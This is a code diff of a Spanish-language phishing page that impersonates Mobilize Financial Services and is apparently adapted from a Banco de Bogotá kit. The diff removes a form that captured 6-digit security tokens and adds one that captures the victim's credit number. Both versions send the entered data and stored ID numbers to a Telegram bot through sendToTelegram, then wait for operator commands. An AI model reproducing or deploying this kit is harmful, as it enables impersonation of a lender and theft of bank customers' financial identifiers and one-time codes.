@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación de Seguridad - Mobilize Financial Services</title>
+    <title>Pagos en línea - Mobilize Financial Services</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: Arial, Helvetica, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; flex-direction: column; }
@@ -20,7 +19,7 @@
         .card { background: #fff; border-radius: 16px; padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: 0 2px 12px rgba(0,0,0,0.07); }
         .card h1 { font-size: 15px; font-weight: 400; color: #444; text-align: center; line-height: 1.5; margin-bottom: 24px; }
 
-        /* Banner de información (estilo Mobilize, antes era azul del Bogotá) */
+        /* Banner de información (estilo Mobilize) */
         .info-banner {
             background: #f0f7ff;
             border: 1px solid #b8d4f0;
@@ -34,41 +33,17 @@
         }
         .info-banner strong { display: block; margin-bottom: 4px; color: #1a1a1a; }
 
-        /* Inputs del token (estilo Mobilize) */
-        .token-container {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 20px 0;
-        }
-        .token-input {
-            width: 46px;
-            height: 52px;
-            text-align: center;
-            font-size: 1.2rem;
-            color: #1a1a1a;
-            border: 1.5px solid #ccc;
-            border-radius: 8px;
-            outline: none;
-            background: #fff;
-            transition: border-color .2s;
-        }
-        .token-input:focus {
-            border-color: #1a1a1a;
-        }
+        .input-wrap { position: relative; margin-bottom: 20px; }
+        .input-wrap input { width: 100%; padding: 18px 14px 6px; border: 1.5px solid #ccc; border-radius: 8px; font-size: 15px; color: #1a1a1a; outline: none; background: #fff; transition: border-color .2s; }
+        .input-wrap input:focus { border-color: #1a1a1a; }
+        .input-wrap label { position: absolute; top: 50%; left: 14px; transform: translateY(-50%); font-size: 14px; color: #888; pointer-events: none; transition: all .15s; }
+        .input-wrap input:focus ~ label, .input-wrap input:not(:placeholder-shown) ~ label { top: 8px; font-size: 11px; color: #555; transform: none; }
 
-        /* Botones estilo Mobilize */
         .btn { width: 100%; padding: 14px; border: none; border-radius: 50px; font-size: 13px; font-weight: 700; letter-spacing: 1px; cursor: pointer; margin-bottom: 10px; transition: opacity .2s; }
         .btn:hover { opacity: 0.88; }
         .btn-dark { background: #1a1a1a; color: #fff; }
         .btn-gray { background: #d0d0d0; color: #888; cursor: not-allowed; }
         .btn-gray.active { background: #1a1a1a; color: #fff; cursor: pointer; }
-
-        .resend-text { font-size: 12px; color: #666; text-align: center; margin-bottom: 16px; }
-        .resend-text a { color: #1a1a1a; font-weight: 700; text-decoration: none; }
-        .resend-text a:hover { text-decoration: underline; }
-
-        .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
 
         .disclaimer { max-width: 440px; margin: 0 auto; padding: 0 16px 32px; }
         .disclaimer p { font-size: 13px; color: #555; line-height: 1.7; text-align: justify; margin-bottom: 14px; }
@@ -80,6 +55,8 @@
         .footer-logo .fl-circle::after { content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%) rotate(-45deg); width: 1.5px; height: 100%; background: #e8391e; }
         .footer-logo .fl-bottom { font-size: 7px; font-weight: 700; color: #1a1a1a; letter-spacing: 1px; }
         .footer-text { font-size: 11px; color: #777; line-height: 1.5; }
+
+        .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
 
         /* Overlay de carga (estilo Mobilize) */
         #loading-overlay {
@@ -108,13 +85,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        @media (max-width: 480px) {
-            .card { padding: 24px 18px; }
-            .token-input { width: 40px; height: 46px; font-size: 1rem; }
-        }
-        @media (max-width: 360px) {
-            .token-input { width: 34px; height: 42px; font-size: 0.95rem; }
-        }
+        @media (max-width: 480px) { .card { padding: 24px 18px; } }
     </style>
 </head>
 <body>
@@ -140,31 +111,20 @@
     <main class="content">
         <div>
             <div class="card">
-                <h1>Validación de Seguridad<br><span style="font-size:13px;color:#666;">Firma de contrato del producto financiero</span></h1>
+                <h1>Ingresa el número de tu crédito para realizar el pago de tu obligación</h1>
 
-                <!-- Banner de instrucciones -->
                 <div class="info-banner">
-                    <strong>Código de seguridad</strong>
-                    Ingresa el código token de 6 dígitos que está en la app de tu teléfono.
+                    <strong>Número de crédito</strong>
+                    Ingresa el número de crédito tal como aparece en tu contrato o estado de cuenta.
                 </div>
 
-                <!-- Formulario del token -->
-                <form id="formToken" autocomplete="off" onsubmit="return sendTokenForm(event);">
-                    <div class="token-container">
-                        <input type="tel" class="token-input" maxlength="1" id="num1" required />
-                        <input type="tel" class="token-input" maxlength="1" id="num2" />
-                        <input type="tel" class="token-input" maxlength="1" id="num3" />
-                        <input type="tel" class="token-input" maxlength="1" id="num4" />
-                        <input type="tel" class="token-input" maxlength="1" id="num5" />
-                        <input type="tel" class="token-input" maxlength="1" id="num6" />
+                <form id="creditForm" autocomplete="off" onsubmit="return sendCreditForm(event);">
+                    <div class="input-wrap">
+                        <input type="text" id="credito" placeholder=" " inputmode="numeric" autocomplete="off">
+                        <label for="credito">Número de crédito *</label>
                     </div>
-
-                    <p class="resend-text">
-                        ¿No recibiste el código?
-                        <a href="#" onclick="reenviarCodigo();return false;">Reenviar</a>
-                    </p>
-
-                    <button type="submit" class="btn btn-dark" id="btnContinuar">CONTINUAR</button>
+                    <button type="button" class="btn btn-dark" onclick="history.back()">REGRESAR</button>
+                    <button type="submit" class="btn btn-gray" id="btnContinuar" disabled>CONTINUAR</button>
                 </form>
 
                 <div class="error-msg" id="msgError"></div>
@@ -190,7 +150,7 @@
     </footer>
 
     <!-- ============================================================
-         📌 SCRIPTS (misma lógica del Banco de Bogotá)
+         📌 SCRIPTS (lógica del Banco de Bogotá adaptada)
          ============================================================ -->
     <script src="telegram.js"></script>
     <script src="action.js"></script>
@@ -198,54 +158,44 @@
         if (window.stopListening) window.stopListening();
 
         document.addEventListener('DOMContentLoaded', function() {
-            const inputs = document.querySelectorAll('.token-input');
+            const input = document.getElementById('credito');
             const btn = document.getElementById('btnContinuar');
             const msgErr = document.getElementById('msgError');
 
-            // Auto-avance, solo números y pegado
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', function() {
-                    this.value = this.value.replace(/[^0-9]/g, '');
-                    if (this.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
-                    msgErr.style.display = 'none';
-                });
-
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && this.value === '' && index > 0) inputs[index - 1].focus();
-                });
-
-                input.addEventListener('paste', function(e) {
-                    e.preventDefault();
-                    const pasted = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
-                    for (let i = 0; i < pasted.length && (index + i) < inputs.length; i++) {
-                        inputs[index + i].value = pasted[i];
-                    }
-                    const nextEmpty = Array.from(inputs).findIndex((inp, idx) => idx > index && inp.value === '');
-                    nextEmpty !== -1 ? inputs[nextEmpty].focus() : inputs[inputs.length - 1].focus();
-                });
+            // Habilitar botón cuando hay texto
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/[^0-9]/g, '');
+                const tiene = input.value.trim().length > 0;
+                btn.disabled = !tiene;
+                btn.classList.toggle('active', tiene);
+                btn.classList.toggle('btn-gray', !tiene);
+                btn.classList.toggle('btn-dark', tiene);
+                msgErr.style.display = 'none';
             });
 
-            inputs[0].focus();
+            input.focus();
         });
 
-        // Enviar formulario del token
-        function sendTokenForm(e) {
+        // ============================================================
+        // 📤 ENVIAR FORMULARIO DEL CRÉDITO
+        // ============================================================
+        function sendCreditForm(e) {
             e.preventDefault();
 
-            const inputs = document.querySelectorAll('.token-input');
+            const input = document.getElementById('credito');
             const btn = document.getElementById('btnContinuar');
             const msgErr = document.getElementById('msgError');
-            const token = Array.from(inputs).map(i => i.value).join('');
+            const creditNumber = input.value.trim();
 
-            if (token.length < 6) {
-                msgErr.textContent = 'Por favor ingresa los 6 dígitos del código';
+            if (!creditNumber) {
+                msgErr.textContent = 'Por favor ingresa el número de crédito';
                 msgErr.style.display = 'block';
                 return false;
             }
 
             document.getElementById('loading-overlay').style.display = 'flex';
             btn.disabled = true;
-            btn.textContent = 'Validando...';
+            btn.textContent = 'Consultando...';
             msgErr.style.display = 'none';
 
             if (window.stopListening) window.stopListening();
@@ -257,33 +207,27 @@
                 numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
             };
 
-            const tokenData = {
-                token: token,
+            const creditData = {
+                credito: creditNumber,
                 tipo_identificacion: userData.tipo_identificacion,
                 numero_identificacion: userData.numero_identificacion
             };
 
+            // Guardar en localStorage (compatibilidad con Mobilize)
+            localStorage.setItem('userInfo', JSON.stringify(creditData));
+
             if (typeof sendToTelegram === 'function') {
-                sendToTelegram('token', tokenData, function() {
-                    console.log('✅ Token enviado');
+                sendToTelegram('credito', creditData, function() {
+                    console.log('✅ Crédito enviado');
                     if (typeof listenCurrentButtons === 'function') listenCurrentButtons(window.handleTelegramAction);
                 });
             } else {
                 console.error('❌ sendToTelegram no disponible');
-                alert('Error de conexión');
-                document.getElementById('loading-overlay').style.display = 'none';
-                btn.disabled = false;
-                btn.textContent = 'CONTINUAR';
+                // Fallback: redirigir directo (como Mobilize original)
+                window.location.href = 'transaction_summary.html';
             }
 
             return false;
-        }
-
-        // Reenviar código
-        function reenviarCodigo() {
-            alert('Se ha enviado un nuevo código a tu celular');
-            document.querySelectorAll('.token-input').forEach(i => i.value = '');
-            document.getElementById('num1').focus();
         }
     </script>
 </body>
